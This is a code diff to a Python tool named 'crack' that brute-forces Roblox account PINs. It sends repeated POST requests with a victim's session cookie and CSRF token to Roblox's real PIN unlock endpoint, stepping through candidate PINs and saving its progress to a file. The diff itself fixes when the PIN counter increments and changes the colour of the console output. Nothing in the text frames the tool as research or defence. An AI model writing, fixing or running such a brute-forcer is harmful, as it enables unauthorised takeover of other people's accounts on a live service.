@@ -153,7 +153,7 @@ class crack:
       'X-CSRF-TOKEN': getXsrf(cookie),
       }
       try:
-        v = int(v) + 1
+        int(v)
       except:
         print("[", end="")
         cprint(" ERRORS ", "red", end="")
@@ -170,9 +170,9 @@ class crack:
         v = f'0{v}'
       pin = v
       print("[", end="")
-      cprint(" BRUTEFORCER ", "green", end="")
+      cprint(" BRUTEFORCER ", "magenta", end="")
       print("] " , end="")
-      cprint(f"Trying {pin}...", "red")
+      cprint(f"Trying {pin}...", "magenta")
       open("currentNumber.txt", "w+").write(str(int(v)))
       response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
       try:
@@ -215,6 +215,7 @@ class crack:
           print("] " , end="")
           cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
           break
+        v = int(v) + 1
       except Exception as e:
         print(f"A error has occured{e}")
     else:
